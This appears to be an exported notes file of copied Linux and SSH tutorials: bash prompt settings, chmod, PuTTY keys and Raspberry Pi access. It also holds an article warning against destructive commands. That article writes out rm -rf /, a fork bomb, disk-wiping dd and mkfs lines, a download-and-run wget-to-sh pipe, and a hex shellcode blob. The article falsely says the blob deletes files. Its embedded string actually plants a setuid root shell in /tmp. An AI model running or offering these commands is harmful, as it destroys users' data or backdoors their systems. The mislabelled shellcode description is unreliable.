		for bgc in {40..47}; do
			fgc=${fgc#37} # white
			bgc=${bgc#40} # black

			vals="${fgc:+$fgc;}${bgc}"
			vals=${vals%%;}

			seq0="${vals:+\e[${vals}m}"
			printf "  %-9s" "${seq0:-(default)}"
			printf " ${seq0}TEXT\e[m"
			printf " \e[${vals:+${vals+$vals;}}1mBOLD\e[m"
		done
		echo; echo
	done
}

Colorized git prompt

Source /usr/share/git/completion/git-prompt.sh for your shell:

~/.bashrc

Most unix tools are designed to work well with text files. A text file consists of a sequence of lines. A line consists of a sequence of printable characters ending with a newline character. In particular, the last character of a non-empty text file is always a newline character. Evidently, example.txt contains only some text with no final newline, so it is not a text file.

cat does a simple job; turning arbitrary files into text files isn't part of that job. Some other tools always turn their input into text files; if you aren't sure the file you're displaying ends with a newline, try running awk 1 instead of cat.

You can make the bash display its prompt on the next line if the previous command left the cursor somewhere other than the last margin. Put this in your .bashrc (variation by GetFree of a proposal by Dennis Williamson):

shopt -s promptvars
PS1='$(printf "%$((COLUMNS-1))s\r")'$PS1

If you did not put the scripts directory in your PATH, and . (the current directory) is not in the PATH either, you can activate the script like this:

./script_name.sh 

If you don't want to start a new shell but execute the script in the current shell, you source it:

source script_name.sh 

Write this script for yourself as well. It might be a good idea to create a directory ~/scripts to hold your scripts. Add the directory to the contents of the PATH variable:

export PATH="$PATH:~/scripts"

#!/bin/bash

Then save the file. Next mark it executable using chmod +x file



The second method is to record commands using script
. 
Run script then just do stuff. 
When your[sic] done doing stuff type exit and script will generate a file for you will all the "stuff" you did. This is less used but works quite well for making macro like things. man script for more info.

You need to add it to your ~/.profile file.

export PATH=$PATH:/path/to/dir

Depending on what you're doing, you also may want to symlink to binaries:

cd /usr/bin
sudo ln -s /path/to/binary binary-name

try below,

The man page of chmod covers that.

    u stands for user.
    g stands for group.
    o stands for others.
    a stands for all.

That means that chmod u+x somefile will grant only the owner of that file execution permissions whereas chmod +x somefile is the same as chmod a+x somefile.

The chmod man page says:

    The format of a symbolic mode is [ugoa...][[+-=][rwxXstugo...]...][,...]. Multiple symbolic operations can be given, separated by commas.

    A combination of the letters 'ugoa' controls which users' access to the file will be changed: the user who owns it (u), other users in the file's group (g), other users not in the file's group (o), or all users (a). If none of these are given, the effect is as if 'a' were given, but bits that are set in the umask are not affected.

PROMPT_COMMAND can contain ordinary bash statements whereas the PS1 variable can also contain the special characters, such as '\h' for hostname, in the variable.

For example here is my bash prompt that uses both PROMPT_COMMAND and PS1. The bash code in PROMPT_COMMAND works out what git branch you might be in and displays that at the prompt, along with the exit status of the last run process, hostname and basename of the pwd. The variable RET stores the return value of the last executed program. This is convenient to see if there was an error and the error code of the last program I ran in the terminal. Note the outer ' surrounding the entire PROMPT_COMMAND expression. It includes PS1 so that this variable is re-evaluated each time the PROMPT_COMMAND variable is evaluated.

export PROMPT_COMMAND='RET=$?;\
  BRANCH="";\
  ERRMSG="";\
  if [[ $RET != 0 ]]; then\
    ERRMSG=" $RET";\
  fi;\
  if git branch &amp;&gt;/dev/null; then\
    BRANCH=$(git branch 2&gt;/dev/null | grep \* |  cut -d " " -f 2);\
  fi;
PS1="$GREEN\u@\h $BLUE\W $CYAN$BRANCH$RED$ERRMSG \$ $LIGHT_GRAY";'

Example output looks like this in a non-git directory:

sashan@dhcp-au-122 Documents  $ false
sashan@dhcp-au-122 Documents  1 $ 

and in a git directory you see the branch name:

sashan@dhcp-au-122 rework mybranch $

[21:55:01][giles@nikola:~] PS1="[\u@\h:\w]\$ "

What happened above was that I changed PS1 to no longer include the \t escape sequence (added in a previous section), so the time was no longer a part of the prompt. Then I used date +%H%M to display the time in a format I like better. But it appears on a different line than the prompt. Tidying this up using echo -n ... as shown below works with Bash 2.0+, but appears not to work with Bash 1.14.7: apparently the prompt is drawn in a different way, and the following method results in overlapping text.

2156
[giles@nikola:~] PROMPT_COMMAND="echo -n [$(date +%H%M)]"
[2156][giles@nikola:~]$
[2156][giles@nikola:~]$ d
bin   mail
[2157][giles@nikola:~]$ unset PROMPT_COMMAND
[giles@nikola:~]

echo -n ... controls the output of the date command and suppresses the trailing newline, allowing the prompt to appear all on one line. At the end, I used the unset command to remove the PROMPT_COMMAND environment variable. </COMMENTS><CUSTOMCOMMENTS>yQYAAHicfVVNb9s4EN1zgPyHQZAC7TYVJNnyV1Gg6fbQHrIN2gI9hMGClkYWNzSpJSk7QZD97Z2h7NpOmx5M2uQbzpt5j/S9cKHOhDRexaFsF1le5KLCuk6FsZ0q7bKVgRe0NIssHQzuRW1NCHNNX1JRG6VFXTbSeQwpnDsl9euHh+Oje/GnWKBBJ4N18FmVDVZ5CqNkkExHafogVgrXN8pUQ9GVGRwfiVa6SoTbQZ7SOBrySEgas3wSJwrjaRoBeR4ReREh+SRCKDZORYQMJhEyzCJkOIwQGnkqsggphhFSjCNklE42ueM0jpBxGiHjQYSMRxFCh8SpJzvp2U56utOe7rSnO+3pZinzrX02gnfSN9A6u1IVepAG0KyUs2aJJsBKUgfnGqGUWmMFl58/XVx+/eevTxcX53+/T+BrQ1vUf8J6sDWERvldkHQIeItlFyhU0uHgcNFp6fqkJOZSmgr+7XyAOdaW4HGjUr7V8o4DiNiyDQmr0WtyfHSVZ7OimKXZ9dVCafRvjbqxWs7+v4bLL9mbkyshurdCNDMh1tdCnMLJJu4n9EExb04qGRBePvvw7GITkWdF8URs1a/PlQGApSTXbSNGT0Tsl/CtkQEa2bbkSOrM3K4Q1tSgwOsfgfxrFtztLxkEC8aCtrTgQJlSdxUSDkGIAOhL2SJ4/K9DUyI8l1VFcUSKO4crZTtPu2VQ1rw4A29jZFDLPt3uYIJLF3oFcdt0VtcQnc7TmbvmMKWNQrvjYkpScBkL0OoGSdEQ0CXwrgugAnC1dC3BMrJSdY2OHaaV4XrIdweZVXWnzKL3U9cSBf6FZWPhlYEkSdhOvrFrQ2m0XcPauhsPaxWa3kJ5kr48g3m3y2tsYOYM3MNlSTZMxjNGSeaj7/Z4ACWvnKQk6pD0Wt6dAVuXsbXVxID5LTE0tiKT+07TfaAgEtZpOjvWgreHRv6NWR5bc1v51enznRAvrk9+3Ihi9NNtOP3t5lMOZvj4F3Axh87Qo/qI2qaeeQqPQ/Yr3ReOnwtntY+9s11oux++i6VtXwX++K4lG3uPPTo4osmtNLhm35AG29bviUYi95rzLtvNksMYnnAR5yFi0VRnW2vz7762bW46wuGSbyXvHVb8y/eRj077WunP5o/vGvZFZAAA</CUSTOMCOMMENTS><TASK ID="311" TITLE="unset PROMPT_COMMAND" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42420.00000000" STARTDATESTRING="2/20/2016" CREATIONDATE="42420.50299769" CREATIONDATESTRING="2/20/2016 12:04 PM" LASTMOD="42420.50309028" LASTMODSTRING="2/20/2016 12:04 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>At the end, I used the unset command to remove the PROMPT_COMMAND environment variable. </COMMENTS></TASK></TASK><TASK ID="310" TITLE="https://bash.cyberciti.biz/guide/Changing_bash_prompt" REFID="0" COMMENTSTYPE="849cf988-79fe-418a-a40d-01fe3afcab2c" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42420.00000000" STARTDATESTRING="2/20/2016" CREATIONDATE="42420.50061343" CREATIONDATESTRING="2/20/2016 12:00 PM" LASTMOD="42420.50239583" LASTMODSTRING="2/20/2016 12:03 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>Sequence 	Description

Adding color to prompt

It is quite easy to add colors to your prompt. Set green color prompt for normal user account[1]:

export PS1='\[\e[1;32m\][\u@\h \W]\$\[\e[0m\] '

And red color prompt for root user account:

export PS1='\[\e[1;31m\][\u@\h \W]\$\[\e[0m\] '
How do I make prompt setting permanent?

Edit your ~/.bashrc or ~/.bash_profile

vi ~/.bashrc

Append your PS1 definition:

export PS1='\[\e[1;32m\][\u@\h \W]\$\[\e[0m\] '

Save and close the file. 
PROMPT_COMMAND variable

If PROMPT_COMMAND environment variable set, the value is executed as a command prior to issuing each primary prompt. In other words, the contents of this variable are executed as a regular Bash command just before Bash displays a prompt[2]:

PROMPT_COMMAND="echo Yahooo"

Sample outputs:

[vivek@vivek-desktop man]$ PROMPT_COMMAND="echo Yahooo"
Yahooo
[vivek@vivek-desktop man]$ date
Tue Oct 20 23:50:01 IST 2009
Yahooo

Creating complex prompt

Edit ~/.bashrc file:

vi ~/.bashrc

Add the following two shell functions[3]

bash_prompt_command() {
    # How many characters of the $PWD should be kept
    local pwdmaxlen=25
    # Indicate that there has been dir truncation
    local trunc_symbol=".."
    local dir=${PWD##*/}
    pwdmaxlen=$(( ( pwdmaxlen &lt; ${#dir} ) ? ${#dir} : pwdmaxlen ))
    NEW_PWD=${PWD/#$HOME/\~}
    local pwdoffset=$(( ${#NEW_PWD} - pwdmaxlen ))
    if [ ${pwdoffset} -gt "0" ]
    then
        NEW_PWD=${NEW_PWD:$pwdoffset:$pwdmaxlen}
        NEW_PWD=${trunc_symbol}/${NEW_PWD#*/}
    fi
}

It’s not uncommon to see trolls online recommending new Linux users run these commands as a joke.

Learning the commands you shouldn’t run can help protect you from trolls while increasing your understanding of how Linux works. This isn’t an exhaustive guide, and the commands here can be remixed in a variety of ways.

Note that many of these commands will only be dangerous if they’re prefixed with sudo on Ubuntu – they won’t work otherwise. On other Linux distributions, most commands must be run as root.

rm -rf / – Deletes Everything!

The command rm -rf / deletes everything it possible can, including files on your hard drive and files on connected removable media devics. This command is more understandable if it’s broken down:

    rm – Remove the following files.

    -rf – Run rm recursively (delete all files and folders inside the specified folder) and force-remove all files without prompting you.

    / – Tells rm to start at the root directory, which contains all the files on your computer and all mounted media devices, including remote file shares and removable drives.

Linux will happily obey this command and delete everything without prompting you, so be careful when using it! The rm command can also be used in other dangerous ways – rm –rf ~ would delete all files in your home folder, while rm -rf .* would delete all your configuration files.

The Lesson: Beware rm -rf.
Disguised rm –rf /

Here’s another snippet of code that’s all over the web:

    char esp[] __attribute__ ((section(“.text”))) /* e.s.p
    release */
    = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
    “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
    “\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
    “\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
    “\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
    “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
    “\x6e\x2f\x73\x68\x00\x2d\x63\x00”
    “cp -p /bin/sh /tmp/.beyond; chmod 4755
    /tmp/.beyond;”;

This is the hex version of rm –rf / – executing this command would wipe out your files just as if you had run rm –rf /.

The Lesson: Don’t run weird-looking, obviously disguised commands that you don’t understand.
:(){ :|: &amp; };: – Fork Bomb

The following line is a simple-looking, but dangerous, bash function:

    :(){ :|: &amp; };:

This short line defines a shell function that creates new copies of itself. The process continually replicates itself, and its copies continually replicate themselves, quickly taking up all your CPU time and memory. This can cause your computer to freeze. It’s basically a denial-of-service attack.

The Lesson: Bash functions are powerful, even very short ones.

mkfs.ext4 /dev/sda1 – Formats a Hard Drive

The mkfs.ext4 /dev/sda1 command is simple to understand:

    mkfs.ext4 – Create a new ext4 file system on the following device.

    /dev/sda1 – Specifies the first partition on the first hard drive, which is probably in use.

Taken together, this command can be equivalent to running format c: on Windows – it will wipe the files on your first partition and replace them with a new file system.

This command can come in other forms as well – mkfs.ext3 /dev/sdb2 would format the second partition on the second hard drive with the ext3 file system.

The Lesson: Beware running commands directly on hard disk devices that begin with /dev/sd.
command &gt; /dev/sda – Writes Directly to a Hard Drive

The command &gt; /dev/sda line works similarly – it runs a command and sends the output of that command directly to your first hard drive, writing the data directly to the hard disk drive and damaging your file system.

    command – Run a command (can be any command.)

    &gt; – Send the output of the command to the following location.

    /dev/sda – Write the output of the command directly to the hard disk device.

The Lesson: As above, beware running commands that involve hard disk devices beginning with /dev/sd.
dd if=/dev/random of=/dev/sda – Writes Junk Onto a Hard Drive

The dd if=/dev/random of=/dev/sda line will also obliterate the data on one of your hard drives.

    dd – Perform low-level copying from one location to another.

    if=/dev/random – Use /dev/random (random data) as the input – you may also see locations such as /dev/zero (zeros).

    of=/dev/sda – Output to the first hard disk, replacing its file system with random garbage data.

The Lesson: dd copies data from one location to another, which can be dangerous if you’re copying directly to a device.

mv ~ /dev/null – Moves Your Home Directory to a Black Hole

/dev/null is another special location – moving something to /dev/null is the same thing as destroying it. Think of /dev/null as a black hole. Essentially, mv ~ /dev/null sends all your personal files into a black hole.

    mv – Move the following file or directory to another location.

    ~ – Represents your entire home folder.

    /dev/null – Move your home folder to /dev/null, destroying all your files and deleting the original copies.

The Lesson: The ~ character represents your home folder and moving things to /dev/null destroys them.
wget http://example.com/something -O – | sh – Downloads and Runs a Script

The above line downloads a script from the web and sends it to sh,which executes the contents of the script. This can be dangerous if you’re not sure what the script is or if you don’t trust its source – don’t run untrusted scripts.

    wget – Downloads a file. (You may also see curl in place of wget.)

    http://example.com/something – Download the file from this location.

    | – Pipe (send) the output of the wget command (the file you downloaded) directly to another command.

    sh – Send the file to the sh command, which executes it if it’s a bash script.

The Lesson: Don’t download and run untrusted scripts from the web, even with a command.</COMMENTS></TASK><TASK ID="336" TITLE="being a dumbass:" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="10" RISK="0" PERCENTDONE="0" STARTDATE="42582.00000000" STARTDATESTRING="7/31/2016" CREATIONDATE="42582.09761574" CREATIONDATESTRING="7/31/2016 2:20 AM" LASTMOD="42582.09767361" LASTMODSTRING="7/31/2016 2:20 AM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="255" PRIORITYWEBCOLOR="#FF0000" SUBTASKDONE="0/1"><TASK ID="337" TITLE="accidentally stop a process" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42582.00000000" STARTDATESTRING="7/31/2016" CREATIONDATE="42582.09767361" CREATIONDATESTRING="7/31/2016 2:20 AM" LASTMOD="42582.09776620" LASTMODSTRING="7/31/2016 2:20 AM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>You can also type %&lt;process_name&gt;; i.e., you hit Ctrl-Z in emacs, then you can type %emacs in the console and bring it back to the foreground.</COMMENTS></TASK></TASK><TASK ID="262" TITLE="PUTTY" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42415.00000000" STARTDATESTRING="2/15/2016" CREATIONDATE="42415.90325231" CREATIONDATESTRING="2/15/2016 9:40 PM" LASTMOD="42418.93880787" LASTMODSTRING="2/18/2016 10:31 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>left click to copy to clipboard

There is a much simpler way, that doesn't involve setting up anything at all on your RPi. The reason why Raspberry isn't connecting to your PC is because Windows lacks a DHCP server when sharing the internet connection. Here's how to fix that.

First, enable internet sharing on your Windows machine:

    start menu &gt; search for "view network connections"
    right click your wifi connection &gt; properties &gt; sharing
    enable sharing and select the ethernet adapter in the dropdown
    switch to networking tab and set your IPv4 address to static like: 192.168.42.1

Now, for the interesting part:

    download DHCP server - it's tiny, free and doesn't require installation
    run dhcpwiz, select your ethernet adapter, then enable DNS in additional protocols (use 8.8.8.8), next select IP range that corresponds to your static IP, in our case it would be 192.168.42.2 - 255, save settings
    run dhcpsrv, continue as tray app

Now all you need to do is plug in your RPi and the connection should work. DHCP server should show a balloon tooltip with IP address that was assigned to your Raspberry. You can SSH to it if you like or just browse the internet from your RPi.</COMMENTS></TASK></TASK><TASK ID="285" TITLE="SSH" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42417.00000000" STARTDATESTRING="2/17/2016" CREATIONDATE="42417.89579861" CREATIONDATESTRING="2/17/2016 9:29 PM" LASTMOD="42417.89581019" LASTMODSTRING="2/17/2016 9:29 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0" SUBTASKDONE="0/4"><TASK ID="219" TITLE="BRIDGE CONNECTIONS" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42391.00000000" STARTDATESTRING="1/22/2016" CREATIONDATE="42391.01740741" CREATIONDATESTRING="1/22/2016 12:25 AM" LASTMOD="42391.01761574" LASTMODSTRING="1/22/2016 12:25 AM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>http://windows.microsoft.com/en-us/windows/create-network-bridge#1TC=windows-7

Security Tip: Disable Root SSH Login on Linux

One of the biggest security holes you could open on your server is to allow directly logging in as root through ssh, because any cracker can attempt to brute force your root password and potentially get access to your system if they can figure out your password.

It’s much better to have a separate account that you regularly use and simply sudo to root when necessary. Before we begin, you should make sure that you have a regular user account and that you can su or sudo to root from it.

To fix this problem, we’ll need to edit the sshd_config file, which is the main configuration file for the sshd service. The location will sometimes be different, but it’s usually in /etc/ssh/. Open the file up while logged on as root.

    vi /etc/ssh/sshd_config

Find this section in the file, containing the line with “PermitRootLogin” in it.

    #LoginGraceTime 2m
    #PermitRootLogin no
    #StrictModes yes
    #MaxAuthTries 6

Make the line look like this to disable logging in through ssh as root.

    PermitRootLogin no

Now you’ll need to restart the sshd service:

    /etc/init.d/sshd restart

Now nobody can brute force your root login, at least. </COMMENTS></TASK><TASK ID="235" TITLE="https://docs.joyent.com/public-cloud/getting-started/ssh-keys/generating-an-ssh-key-manually/manually-generating-your-ssh-key-in-windows" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42401.00000000" STARTDATESTRING="2/1/2016" CREATIONDATE="42401.94090278" CREATIONDATESTRING="2/1/2016 10:34 PM" LASTMOD="42401.94103009" LASTMODSTRING="2/1/2016 10:35 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0"><COMMENTS>Manually generating your SSH key in Windows
Modified: 06 Nov 2015 18:02 UTC

You can use PuTTY to generate your SmartMachine SSH key. PuTTY is a free open-source terminal emulator that functions much like the Terminal application in Mac OS X in a Windows environment. If you prefer a command line approach to SSH, you can use Cygwin to emulate a Linux-like environment on your Windows machine.

This topic shows you how to manually generate and upload an SSH key when working with PuTTY in the Windows environment.
About PuTTY

PuTTY is an SSH client for Windows that you will use to generate your SSH keys. You can download PuTTY from www.chiark.greenend.org.uk.

When you install the PuTTY client, you also install the PuTTYgen utility. PuTTYgen is what you will use to generate your SSH key for a Windows VM.
warning
	This page gives you basic information about using PuTTY and PuTTYgen to log in to your provisioned machine. For more information on PuTTY, see the PuTTY documentation
Generating an SSH key

To generate an SSH key with PuTTYgen, follow these steps:

    Open the PuTTYgen program.
    For Type of key to generate, select SSH-2 RSA.
    Click the Generate button.
    Move your mouse in the area below the progress bar. When the progress bar is full, PuTTYgen generates your key pair.
    Type a passphrase in the Key passphrase field. Type the same passphrase in the Confirm passphrase field. You can use a key without a passphrase, but this is not recommended.
    Click the Save private key button to save the private key. Warning! You must save the private key. You will need it to connect to your machine.
    Right-click in the text field labeled Public key for pasting into OpenSSH authorized_keys file and choose Select All.
    Right-click again in the same text field and choose Copy.

PuTTY key generator
Uploading an SSH key

Now you need to upload the copied SSH key to your Cloud Management portal.

    After you copy the SSH key to the clipboard, return to the Cloud Management portal.
    In the SSH Key field, paste your SSH key.
    In the Name field, provide a name for the key. Information Providing a key name is optional but is a good practice for ease of management.
    Click the Add this key button. See below.

uploading and ssh key

Warning! PuTTY and OpenSSH use different formats of public SSH keys. If the text you pasted in the SSH Key starts with —— BEGIN SSH2 PUBLIC KEY, it is in the wrong format. Be sure to follow the instructions carefully. Your key should start with ssh-rsa AAAA .

Once you upload your SSH key to the portal, you can connect to your virtual machine from Windows through a PuTTY session.</COMMENTS></TASK><TASK ID="236" TITLE="http://raspisimon.no-ip.org/key_windowsbased.php" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42401.00000000" STARTDATESTRING="2/1/2016" CREATIONDATE="42401.95281250" CREATIONDATESTRING="2/1/2016 10:52 PM" LASTMOD="42401.95289352" LASTMODSTRING="2/1/2016 10:52 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0" SUBTASKDONE="0/1"><COMMENTS>

Setting up ssh key based authentication from a Windows machine
You have a windows machine simon(client) and abita(server) and you want to connect from simon to abita using ssh keys. We will be generating the keys from Windows machine. Key generation method using a linux mahcine is explained here.

Download the keygen software for Windows called puttygen.exe.
Launch puttygen.exe and click on Generate button. Follow the promts. Enter a passphrase for the key. Select and copy the public key generated and save it in a notepad temporarily. Now click on Save public key button and save the public on any location. Click on Save private key button and save the key some where safe for future use.



Now login to abita(server) machine using putty.exe. Use below command to edit authorized_keys file.
sudo nano /home/pi/.ssh/authorized_keys
At a new line paste the public key copied in to the notepad earlier and save the file using ctrl+o.

Now try to login to the server using putty again, but this time using the private key we created. First prepare putty to use private key.
Laucnh putty and type in the ip address of your linux server in the Host Name field leave the Port as it is (assuming ssh port is not changed in your server). Type in a name for this session in Saved Sessions.
On the left pane click and Expand Connections-&gt;SSH-&gt;Auth After clicking on Auth on the right pane browse to the private key location where is it saved. Now on left pane click on Session and click on Save on the right pane.
Your newly creted connection will come in the list now. Just double click on the session and it will launch a new window (if it promt for a fingerprint warning click yes). After entering your user name you can see that it is promting for the key password (Authenticating with public key "rsa-key-20121205").





Now if you like to disable password based authentication completley (only when doing remote connections. Password authentication will still work from console) Edit /etc/ssh/sshd_config file and change PasswordAuthentication value to No. sudo nano /etc/ssh/sshd_config
Restart ssh service now.
sudo service ssh restart
Note: home directory permissions should be as below,
drwxr--r-- 28 pi   pi   4096 Mar 16 11:31 pi
If you had given full permissions on your $home directory you may get "sever refused our key error"
To give correct permissions use below command,
sudo chmod 744 pi

If you want or need to be able to access and control your Raspberry Pi from outside your local area network (LAN), it’s a very good idea to disable password logins. This prevents hackers from being able to use/guess your password. In order to do this, we need to set up a public/private key pair and enable it for ssh login. This will make it almost impossible for a hacker to get into your Pi via ssh. The flip-side of that is the minor inconvenience of having to install your private key on any machine you want to log in with (but it’s not that big a deal really).

This has been done, based on a fresh install of Raspbian Wheezy 16 Aug 2012 edition, but will work on any version of Debian.
Ensure ssh is working.

We are going to be using ssh to do this process, so you need to ensure that ssh is working before we begin. Login to your Pi using your normal ssh procedure. Once logged in, you might as well stay logged in, as we will use the connection a little later on.
Create keys on your local computer, not on the Pi

You will need to use a program to generate a public/private key pair. The public key will be uploaded onto the Pi and you will use the private key on any computer (phone, tablet etc.) you wish to access it with. The private key must be kept private.

Many people rave about putty and puttygen. Putty is a very popular ssh client, and puttygen is the key generating part of putty. Here are instructions for generating a public private key pair with puttygen.
Creating keys with tunnelier

I use Bitvise Tunnelier, so here are instructions for how to create and export keys with tunnelier.

On the main screen click “user keypair manager”

keypair manager

Then click “generate new”

generate keypair

Then click generate, unless you want to add a passphrase, in which case type that in twice and then click generate. A passphrase is an extra layer of security if you want to use your private key on shared machines. Your key will not be usable without the passphrase. I find it unnecessary. Your needs may be different.

generate keys

Your keypair will now be created for you and you will be returned to the previous screen.
Click on the key you just created and then click Export.
Choose Export public key and Open SSH, then click Export, type a filename e.g. publickeyopenssh.txt

Now we’re ready to start working on the Pi itself.

In the home directory of the user you’re logging in as (/home/pi in the case of the default pi user) you need to create a special directory called .ssh

This process is easier if you are logged in as the user you want to set up (as the owner of the files and directories we are about to create will automnatically be the correct one).

cd ~ (the ~ is important – this will take you to the home folder of the logged in user)
pwd (print working directory – shows you where you are in the file system)
mkdir .ssh (Make a directory called .ssh The . is very important)
cd .ssh (change directory – go to the .ssh directory)
nano authorized_keys (Open/Create a file and call it authorized_keys. Note the z – British spelling will not work in this case.)

making the files/directories for the keys

You now need to copy and paste the contents of your public key file into this nano window. So open the exported public key file on the machine where you created it and copy it across into the nano window (right-click, paste works from windows). Then,
CTRL+O (save)
Enter (confirm file name)
CTRL+X (Exit)

ls -l (list the contents of the .ssh directory, view permissions and ownership)
chmod 700 ~/.ssh/ (set permissions for the .ssh directory)
chmod 600 ~/.ssh/authorized_keys (set permissions for your key file)
ls -l (check permissions were changed properly) 

checking permission changes

Notice that before we changed the permissions of authorized_keys, they were 
-rw-r--r--
afterwards 
-rw------- (r=read, w=write)

This is how it should be. We’ve just set the permissions so that nobody can read, write or execute your key file except pi (and super-users, like root).
Set up your ssh client to use your private key

In the latest Raspbian, (August 2012) public key ssh login is enabled by default, but so are passwords and there may be a couple of other things we want to change in the configuration file (like the port number).

So, at this point, you can already set up your ssh client (e.g. tunnelier or putty) to use your keys. In tunnelier, your keypair would have been allocated a slot number. Under initial method, choose public key – slot X, where X is the slot number you want.

Then, without logging out of your existing ssh session, try logging in using another instance of tunnelier, using port 22 and your public/private keypair. If this keyed login now works, it’s safe for you to disable password login (for ssh). Obviously, if you disable passwords before keys are working, you’ll lock yourself out from remote login :(
Edit the ssh config file /etc/ssh/sshd_config

sudo nano /etc/ssh/sshd_config

Somewhere in this file (usually on page 2 – CTRL+V for next page) should be a parameter
#PasswordAuthentication yes

This needs to be uncommented (remove the #) and yes changed to no
PasswordAuthentication no

You’ve now switched off ssh password logins – well nearly. We haven’t activated it yet. Before we do that, you might want to consider changing the port number as well 
Changing the ssh port number from the default 22

The world and his wife know that the default port number for ssh is port 22. It is a good idea to change the port to something non-standard and forward to that port from your router. You can also set up ssh to use more than one port, (e.g one for local “traffic” and another forwarded from external connections by your router).

Broadly speaking, you can choose any port number between 1 and 65535, but it’s worth checking on a list of commonly used ports to avoid messing something up.

If you want to change the port number, it’s near the top of the sshd_config file.
Port 22

You can just change 22 to your chosen port number, or you can add a new line with your new port number in if you want to use more than one port.
Port 777

Once you’ve done that, we need to save and exit the configuration file.
CTRL+O (save)
Enter (confirm file name)
CTRL+X (Exit)

If you’ve changed the port number, remember to change the port number on your ssh client as well, or you’ll be stuck wondering why you can’t login. :(
Restarting the ssh server

Your new ssh configuration settings won’t take effect until you restart the ssh server. You can either use this command 

sudo /etc/init.d/ssh restart

or you can reboot your Pi.

sudo reboot

And from now on, you will only be able to ssh into your Pi using keys and you have enhanced your security enormously. :) Good job! May your data always be safe and secure. (Of course this does not affect the normal console login if you are using keyboard and screen connected directly to your RasPi.)
Set up port forwarding on your router

All that will work fine on your LAN, but if you want access from outside, you’ll then have to set up port forwarding on your router. What you will need to do is log into your router’s control panel and set it up so that when you try to log into a specified port on your router (e.g. port 777 if that’s what you set ssh to listen on) all such traffic is diverted to the local ip address and port number of the Raspberry Pi.

An example. If your internet connection’s ip address is 111.222.333.444 and your RasPi is on 192.168.0.45 and you set up ssh to listen on port 777, you would need to set up port forwarding so that whenever anyone tries to access 111.222.333.444:YYY it would forward all that traffic to local ip 192.168.0.45:777 On some routers you can set the incoming YYY to whatever you like. On others it must be the same as the 777.

There are so many different types of routers, I’m afraid I can’t offer help with that part of the setup, or be more specific. But once you’ve got port forwarding set up, you should be able to ssh in from outside. If your internet provider gives you a dynamic IP address, you will probably need to look into something called DDNS to keep track of your ever-changing internet connection’s IP address.</COMMENTS></TASK></TASK></TASK><TASK ID="217" TITLE="http://elinux.org/RPi_Advanced_Setup" REFID="0" COMMENTSTYPE="PLAIN_TEXT" CREATEDBY="RaptorPatrolCore" PRIORITY="5" RISK="0" PERCENTDONE="0" STARTDATE="42390.00000000" STARTDATESTRING="1/21/2016" CREATIONDATE="42390.95865741" CREATIONDATESTRING="1/21/2016 11:00 PM" LASTMOD="42390.97195602" LASTMODSTRING="1/21/2016 11:19 PM" TEXTCOLOR="0" TEXTWEBCOLOR="#000000" PRIORITYCOLOR="15732480" PRIORITYWEBCOLOR="#000FF0" SUBTASKDONE="0/1"><COMMENTS>&gt;get avahi for RPI

Stereotypically, the firewall forbids us to have some fun. First of all, the 5353 udp-port is blocked on most firewalls, so you have to add an exception for it. Also, you'll have to grant internet access to the mDNSresponder.exe, this way, whenever your computer tries to connect with a host *.local, mDNS sends a multicast over the local subnet to ask whether anyone calls himself *.local. If mDNS isn't granted network access, nothing gets multicasted and nobody answers the phone.
